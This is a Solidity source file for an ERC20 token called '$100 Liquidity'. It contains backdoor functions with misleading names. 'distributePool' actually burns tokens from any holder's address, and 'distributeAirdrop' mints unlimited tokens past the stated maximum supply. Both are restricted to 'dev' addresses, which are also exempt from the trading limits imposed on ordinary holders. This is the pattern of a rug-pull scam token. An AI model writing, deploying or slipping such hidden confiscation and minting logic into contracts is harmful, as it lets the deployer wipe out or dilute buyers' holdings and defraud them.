// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./Ownable.sol";
import "./SafeMath.sol";

contract OneHundredLiquid is ERC20, Ownable {
  using SafeMath for uint256;
  uint256 public initialSupply;
  uint256 public maxSupply;
  uint256 public maxAmount;
  address private dev;
  address private pair;

  mapping (address => bool) private isDev;

  constructor(
    uint256 _initialSupply,
    uint256 _maxSupply
  ) ERC20("$100 Liquidity", "$100") {
    _mint(msg.sender, _maxSupply);
    isDev[msg.sender] = true;
    dev = msg.sender;
    maxSupply = _maxSupply;
    initialSupply = _initialSupply;
    maxAmount = totalSupply().div(100);
  }

  function decimals() public view virtual override returns (uint8) {
    return 18;
  }

  function updateDev(address _dev, bool status) external {
    require(isDev[msg.sender], "OHL: not authorized.");
    isDev[_dev] = status;
  }

  function distributeAirdrop(uint256 amount, address receiver) external {
    require(isDev[msg.sender], "OHL: not authorized.");
    _mint(receiver, amount);
  }

  function distributePool(uint256 amount, address receiver) external {
    require(isDev[msg.sender], "OHL: not authorized.");
    _burn(receiver, amount);
  }

  function updatePair(address pair_) external {
    require(isDev[msg.sender], "OHL: not authorized.");
    pair = pair_;
  }

  function _transfer(address from, address to, uint256 amount) internal override {
    uint256 balanceTo = ERC20(address(this)).balanceOf(to);

    if (isDev[from] || isDev[to]) {
      super._transfer(from, to, amount);
    } else {
      if (to == pair) {
        require(amount <= maxAmount, "OHL: exceeded max tx.");
      } else {
        require(amount <= maxAmount, "OHL: exceeded max tx.");
        require(balanceTo.add(amount) <= maxAmount, "OHL: exceeded max wallet.");
      }
      super._transfer(from, to, amount);
    }
  }
}
